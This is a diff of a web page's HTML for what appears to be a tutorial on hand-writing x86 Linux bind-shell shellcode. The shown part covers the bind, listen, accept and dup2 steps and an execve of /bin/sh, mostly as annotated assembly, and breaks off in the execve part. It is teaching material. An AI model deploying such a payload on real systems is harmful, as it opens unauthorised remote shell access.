+</span></span></code></pre></td></tr></table></div></div><p>The arguments for <code>socket()</code> are pushed to the stack, $esp which points to the top of the stack is then copied to $ecx which will be the second parameter for <code>socketcall()</code>.</p><blockquote><p><strong>Cool tip</strong></p><p>In order to find information about syscalls and their parameters, running <code>grep -ir "SOCK_STREAM" .</code> in <code>/usr/include/</code> can give you a lot of information.</p></blockquote><h3 id=binding-our-socket>Binding our socket</h3><p>We have created the socket, now it&rsquo;s time to <em>bind</em> it. This means <code>bind()</code> will assign the address and port to the socket referred to by the file descriptor created by <code>socket()</code> in the previous section.</p><p>As always, we run <code>man 2 bind</code>, which gives us:</p><pre tabindex=0><code>BIND(2)                                                            Linux Programmer&#39;s Manual                                                            BIND(2)
 
 NAME
        bind - bind a name to a socket
@@ -396,10 +268,7 @@ DESCRIPTION
            }
 
        The only purpose of this structure is to cast the structure pointer passed in addr in order to avoid compiler warnings.  See EXAMPLE below.
-</code></pre><p>The interesting part here is the second parameter which expects <code>const struct sockaddr *addr</code>, in order to satisfy this requirement, we need to look at the struct definitions. However, according to the man pages, we should cast the struct <code>sockaddr_in</code> to <code>sockaddr</code>, so we should look for the struct definition of <code>sockaddr_in</code>. This can be found in: <code>/usr/include/linux/in.h</code>, this gives us:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>The interesting part here is the second parameter which expects <code>const struct sockaddr *addr</code>, in order to satisfy this requirement, we need to look at the struct definitions. However, according to the man pages, we should cast the struct <code>sockaddr_in</code> to <code>sockaddr</code>, so we should look for the struct definition of <code>sockaddr_in</code>. This can be found in: <code>/usr/include/linux/in.h</code>, this gives us:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -415,48 +284,31 @@ DESCRIPTION
 </span><span class=lnt>14
 </span><span class=lnt>15
 </span><span class=lnt>16
-</span><span class=lnt>17
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/* Structure describing an Internet (IP) socket address. */</span>
-<span class=cp>#define __SOCK_SIZE__   16              </span><span class=cm>/* sizeof(struct sockaddr)      */</span><span class=cp>
-</span><span class=cp></span><span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=p>{</span>
-  <span class=n>__kernel_sa_family_t</span>  <span class=n>sin_family</span><span class=p>;</span>     <span class=cm>/* Address family               */</span>
-  <span class=n>__be16</span>                <span class=n>sin_port</span><span class=p>;</span>       <span class=cm>/* Port number                  */</span>
-  <span class=k>struct</span> <span class=n>in_addr</span>        <span class=n>sin_addr</span><span class=p>;</span>       <span class=cm>/* Internet address             */</span>
-
-  <span class=cm>/* Pad to size of `struct sockaddr&#39;. */</span>
-  <span class=kt>unsigned</span> <span class=kt>char</span>         <span class=n>__pad</span><span class=p>[</span><span class=n>__SOCK_SIZE__</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>short</span> <span class=kt>int</span><span class=p>)</span> <span class=o>-</span>
-                        <span class=k>sizeof</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>short</span> <span class=kt>int</span><span class=p>)</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>in_addr</span><span class=p>)];</span>
-<span class=p>};</span>
-<span class=cp>#define sin_zero        __pad           </span><span class=cm>/* for BSD UNIX comp. -FvK      */</span><span class=cp>
-</span><span class=cp></span>
-<span class=k>struct</span> <span class=n>in_addr</span> <span class=p>{</span>
-        <span class=n>__be32</span>  <span class=n>s_addr</span><span class=p>;</span>
-<span class=p>};</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><p><code>__kernel_sa_family_t</code> is defined as <code>typedef unsigned short __kernel_sa_family_t;</code> in <code>/usr/include/linux/socket.h</code>. From these definitions, we can write the following instructions:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Structure describing an Internet (IP) socket address. */</span>
+</span></span><span class=line><span class=cl><span class=cp>#define __SOCK_SIZE__   16              </span><span class=cm>/* sizeof(struct sockaddr)      */</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>__kernel_sa_family_t</span>  <span class=n>sin_family</span><span class=p>;</span>     <span class=cm>/* Address family               */</span>
+</span></span><span class=line><span class=cl>  <span class=n>__be16</span>                <span class=n>sin_port</span><span class=p>;</span>       <span class=cm>/* Port number                  */</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>in_addr</span>        <span class=n>sin_addr</span><span class=p>;</span>       <span class=cm>/* Internet address             */</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=cm>/* Pad to size of `struct sockaddr&#39;. */</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>char</span>         <span class=n>__pad</span><span class=p>[</span><span class=n>__SOCK_SIZE__</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>short</span> <span class=kt>int</span><span class=p>)</span> <span class=o>-</span>
+</span></span><span class=line><span class=cl>                        <span class=k>sizeof</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>short</span> <span class=kt>int</span><span class=p>)</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>in_addr</span><span class=p>)];</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl><span class=cp>#define sin_zero        __pad           </span><span class=cm>/* for BSD UNIX comp. -FvK      */</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>in_addr</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>__be32</span>  <span class=n>s_addr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>__kernel_sa_family_t</code> is defined as <code>typedef unsigned short __kernel_sa_family_t;</code> in <code>/usr/include/linux/socket.h</code>. From these definitions, we can write the following instructions:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>    <span class=c1>; setup sockaddr struct</span>
-    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
-    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x3905</span> <span class=c1>; htons(1337)</span>
-    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x2</span>    <span class=c1>; AF_INET</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>The first <code>push</code> simply pushes 0x00000000 to the stack, this indicates we want to listen on <code>0.0.0.0</code>. The second push is our port number. We need to specify the port in network byte order (reverse) in order to listen on <code>1337</code>. <code>__be16</code> informs us that it expects 16 bits, therefore we push it as a <code>word</code>. Next push is the network family which we learned from the previous section that it is 0x2 for AF_INET (IPv4). The length of an <code>unsigned short</code> is 16 bits, therefore we push it as a <code>word</code>.</p>
-<p>The complete instructions for binding our socket looks like this:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl>    <span class=c1>; setup sockaddr struct</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x3905</span> <span class=c1>; htons(1337)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x2</span>    <span class=c1>; AF_INET</span>
+</span></span></code></pre></td></tr></table></div></div><p>The first <code>push</code> simply pushes 0x00000000 to the stack, this indicates we want to listen on <code>0.0.0.0</code>. The second push is our port number. We need to specify the port in network byte order (reverse) in order to listen on <code>1337</code>. <code>__be16</code> informs us that it expects 16 bits, therefore we push it as a <code>word</code>. Next push is the network family which we learned from the previous section that it is 0x2 for AF_INET (IPv4). The length of an <code>unsigned short</code> is 16 bits, therefore we push it as a <code>word</code>.</p><p>The complete instructions for binding our socket looks like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -476,33 +328,27 @@ DESCRIPTION
 </span><span class=lnt>18
 </span><span class=lnt>19
 </span><span class=lnt>20
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>    <span class=c1>; ---------------------------------</span>
-    <span class=c1>; # Setup bind</span>
-    <span class=c1>; socketcall</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; SYS_BIND </span>
-
-    <span class=c1>; setup sockaddr struct</span>
-    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; Listen on 0.0.0.0</span>
-    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x3905</span> <span class=c1>; htons(1337)</span>
-    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x2</span>    <span class=c1>; AF_INET</span>
-
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Store the address that points to our struct</span>
-    
-    <span class=c1>; Push the arguments for bind()</span>
-    <span class=nf>push</span> <span class=mh>0x10</span>        <span class=c1>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)</span>
-    <span class=nf>push</span> <span class=nb>ecx</span>         <span class=c1>; Points to our sockaddr_in struct</span>
-    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Contains our file descriptor</span>
-
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second parameter for socketcall, points to arguments required by bind()</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel let&#39;s go!</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id=listen-for-incoming-connections>Listen for incoming connections</h3>
-<p>Time to start listening for connections, let&rsquo;s see what the man page can tell us by running <code>man 2 listen</code>:</p>
-<pre tabindex=0><code>LISTEN(2)                                                          Linux Programmer's Manual                                                          LISTEN(2)
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl>    <span class=c1>; ---------------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup bind</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; SYS_BIND </span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; setup sockaddr struct</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; Listen on 0.0.0.0</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x3905</span> <span class=c1>; htons(1337)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x2</span>    <span class=c1>; AF_INET</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Store the address that points to our struct</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>; Push the arguments for bind()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x10</span>        <span class=c1>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>ecx</span>         <span class=c1>; Points to our sockaddr_in struct</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Contains our file descriptor</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second parameter for socketcall, points to arguments required by bind()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel let&#39;s go!</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=listen-for-incoming-connections>Listen for incoming connections</h3><p>Time to start listening for connections, let&rsquo;s see what the man page can tell us by running <code>man 2 listen</code>:</p><pre tabindex=0><code>LISTEN(2)                                                          Linux Programmer&#39;s Manual                                                          LISTEN(2)
 
 NAME
        listen - listen for connections on a socket
@@ -522,10 +368,7 @@ DESCRIPTION
        The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  If a connection request arrives when the
        queue  is  full,  the client may receive an error with an indication of ECONNREFUSED or, if the underlying protocol supports retransmission, the request
        may be ignored so that a later reattempt at connection succeeds.
-</code></pre><p>This instruction set is easy, as can be seen below:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>This instruction set is easy, as can be seen below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -535,24 +378,17 @@ DESCRIPTION
 </span><span class=lnt> 8
 </span><span class=lnt> 9
 </span><span class=lnt>10
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup listen</span>
-    <span class=c1>; socketcall</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x4</span>      <span class=c1>; SYS_LISTEN</span>
-
-    <span class=nf>push</span> <span class=mh>0x2</span>         <span class=c1>; backlog, hold 2 connections in queue</span>
-    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_LISTEN</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Instruct the kernel to run our syscall</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><code>listen()</code> requires just two arguments according to the man page.</p>
-<h3 id=accept-new-connections>Accept new connections</h3>
-<p>We now need to accept connections that are trying to connect, what does <code>man 2 accept</code> say?</p>
-<pre tabindex=0><code>ACCEPT(2)                                                          Linux Programmer's Manual                                                          ACCEPT(2)
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup listen</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x4</span>      <span class=c1>; SYS_LISTEN</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x2</span>         <span class=c1>; backlog, hold 2 connections in queue</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_LISTEN</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Instruct the kernel to run our syscall</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>listen()</code> requires just two arguments according to the man page.</p><h3 id=accept-new-connections>Accept new connections</h3><p>We now need to accept connections that are trying to connect, what does <code>man 2 accept</code> say?</p><pre tabindex=0><code>ACCEPT(2)                                                          Linux Programmer&#39;s Manual                                                          ACCEPT(2)
 
 NAME
        accept - accept a connection on a socket
@@ -570,10 +406,7 @@ SYNOPSIS
                    socklen_t *addrlen, int flags);
 
 [ for the sake of brevity, full output is not shown]
-</code></pre><p>We don&rsquo;t actually care about the second and third parameter for <code>accept()</code>, those are only needed if you want information about the connecting peer, e.g. its address. Therefore the instructions are quite easy:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>We don&rsquo;t actually care about the second and third parameter for <code>accept()</code>, those are only needed if you want information about the connecting peer, e.g. its address. Therefore the instructions are quite easy:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -588,28 +421,22 @@ SYNOPSIS
 </span><span class=lnt>13
 </span><span class=lnt>14
 </span><span class=lnt>15
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup accept</span>
-    <span class=c1>; socketcall</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x5</span>      <span class=c1>; SYS_ACCEPT</span>
-
-    <span class=c1>; Setup accept</span>
-    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
-    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
-    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
-
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_ACCEPT</span>
-
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Execute</span>
-    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax stores the peer&#39;s file descriptor, save it to edi</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id=redirection-and-shell-access>Redirection and shell access</h3>
-<p>We have accepted a connection, time to give it shell access. We use <code>dup2</code> to redirect STDIN, STDOUT and STDERR to the peer&rsquo;s file descriptor. <code>man 2 dup2</code>:</p>
-<pre tabindex=0><code>DUP(2)                                                             Linux Programmer's Manual                                                             DUP(2)
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup accept</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x5</span>      <span class=c1>; SYS_ACCEPT</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; Setup accept</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_ACCEPT</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Execute</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax stores the peer&#39;s file descriptor, save it to edi</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=redirection-and-shell-access>Redirection and shell access</h3><p>We have accepted a connection, time to give it shell access. We use <code>dup2</code> to redirect STDIN, STDOUT and STDERR to the peer&rsquo;s file descriptor. <code>man 2 dup2</code>:</p><pre tabindex=0><code>DUP(2)                                                             Linux Programmer&#39;s Manual                                                             DUP(2)
 
 NAME
        dup, dup2, dup3 - duplicate a file descriptor
@@ -638,10 +465,7 @@ DESCRIPTION
        *  If oldfd is a valid file descriptor, and newfd has the same value as oldfd, then dup2() does nothing, and returns newfd.
 
 [ for the sake of brevity, full output is not shown]
-</code></pre><p>By looking at the C version in the beginning of the article, we simply duplicate process by running <code>dup2</code> for STDIN, STDOUT and STDERR:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>By looking at the C version in the beginning of the article, we simply duplicate process by running <code>dup2</code> for STDIN, STDOUT and STDERR:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -658,29 +482,24 @@ DESCRIPTION
 </span><span class=lnt>15
 </span><span class=lnt>16
 </span><span class=lnt>17
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup dup2</span>
-    <span class=c1>; redirect to stdin</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>     <span class=c1>; syscall number dup2 63 --&gt; 0x3f</span>
-    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>edi</span>     <span class=c1>; peer&#39;s file descriptor</span>
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>edx</span>     <span class=c1>; STDIN</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-
-    <span class=c1>; redirect to stdout</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
-    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; STDOUT</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-
-    <span class=c1>; redirect to stderr</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
-    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; STDERR</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Now it&rsquo;s time to execute <code>/bin/sh</code>. This is done by calling the <code>execv</code> system call, <code>man 3 execv</code>:</p>
-<pre tabindex=0><code>EXEC(3)                                                            Linux Programmer's Manual                                                            EXEC(3)
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup dup2</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; redirect to stdin</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>     <span class=c1>; syscall number dup2 63 --&gt; 0x3f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>edi</span>     <span class=c1>; peer&#39;s file descriptor</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>edx</span>     <span class=c1>; STDIN</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; redirect to stdout</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; STDOUT</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; redirect to stderr</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; STDERR</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span></code></pre></td></tr></table></div></div><p>Now it&rsquo;s time to execute <code>/bin/sh</code>. This is done by calling the <code>execv</code> system call, <code>man 3 execv</code>:</p><pre tabindex=0><code>EXEC(3)                                                            Linux Programmer&#39;s Manual                                                            EXEC(3)
 
 NAME
        execl, execlp, execle, execv, execvp, execvpe - execute a file
@@ -710,10 +529,7 @@ DESCRIPTION
        The initial argument for these functions is the name of a file that is to be executed.
 
 [ for the sake of brevity, full output is not shown]
-</code></pre><p>We will use <code>execv</code> which requires two arguments, the file to be executed and additional arguments for the file being executed. We don&rsquo;t need any additional arguments, therefore we only pass <code>/bin/sh</code>, as can be seen below:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>We will use <code>execv</code> which requires two arguments, the file to be executed and additional arguments for the file being executed. We don&rsquo;t need any additional arguments, therefore we only pass <code>/bin/sh</code>, as can be seen below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -730,32 +546,24 @@ DESCRIPTION
 </span><span class=lnt>15
 </span><span class=lnt>16
 </span><span class=lnt>17
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup execv</span>
-    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
-    <span class=nf>push</span> <span class=nb>edx</span>
-    
-    <span class=c1>; push //bin/sh onto the stack</span>
-    <span class=nf>push</span> <span class=mh>0x68732f6e</span>
-    <span class=nf>push</span> <span class=mh>0x69622f2f</span>  
-
-    <span class=c1>; Set address of esp to ebx, which points</span>
-    <span class=c1>; to //bin/sh</span>
-    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
-    
-    <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
-    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0xb</span>      <span class=c1>; execv syscall</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id=final-code>Final code</h3>
-<p>Now we should have something that looks like this:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup execv</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>    
